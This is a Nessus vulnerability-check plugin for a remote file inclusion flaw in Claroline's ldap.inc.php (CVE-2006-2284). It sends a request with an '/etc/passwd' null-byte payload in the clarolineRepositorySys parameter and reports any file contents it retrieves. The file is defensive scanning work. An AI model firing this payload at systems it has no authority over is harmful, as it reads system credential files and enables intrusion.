#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(21335);
  script_version("$Revision: 1.23 $");

  script_cve_id("CVE-2006-2284");
  script_bugtraq_id(17873);
  script_osvdb_id(25315, 25316);
  script_xref(name:"EDB-ID", value:"1766");

  script_name(english:"Claroline ldap.inc.php clarolineRepositorySys Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file using Claroline");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file include issue." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Claroline, an open source, web-based,
collaborative learning environment written in PHP. 

The version of Claroline installed on the remote host fails to
sanitize input to the 'clarolineRepositorySys' parameter of the
'claroline/auth/extauth/drivers/ldap.inc.php' script before using it
to include files with PHP code.  Provided PHP's 'register_globals'
setting is enabled, an unauthenticated attacker may be able to exploit
this issue to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts. 

Note that there are reportedly several other parameters and scripts
affected by remote file includes in the same version of Claroline,
although Nessus has not tested for these." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2006/May/136" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2006/May/214" );
  # http://web.archive.org/web/20071028175708/http://www.claroline.net/forum/viewtopic.php?t=5578
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d9654b89" );
 script_set_attribute(attribute:"solution", value:
"Apply the patches referenced in the vendor advisory above." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/05/11");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/05/08");
 script_cvs_date("$Date: 2016/10/07 13:30:47 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value: "cpe:/a:claroline:claroline");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");

  script_dependencies("claroline_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/claroline");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/claroline"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit a flaw to read a local file.
  file = "/etc/passwd";
  url = string(
    dir, "/claroline/auth/extauth/drivers/ldap.inc.php?",
    "clarolineRepositorySys=", file, "%00"
  );

  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access and/or remote file inclusion might still work.
    egrep(pattern:"main\(/etc/passwd\\0/auth/extauth/extAuthProcess\.inc\.php.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd[^)]*\): failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction or...
    egrep(pattern:"main.+ open_basedir restriction in effect. File \(/etc/passwd", string:res)
  )
  {
    if (report_verbosity && egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      report = string(
        "\n",
        "Nessus was able to retrieve the contents of '", file, "' on the\n",
        "remote host using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      if (report_verbosity > 1)
      {
        report = string(
          report,
          "\n",
          "Here are the contents :\n",
          "\n",
          "  ", str_replace(find:'\n', replace:'\n  ', string:res), "\n"
        );
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
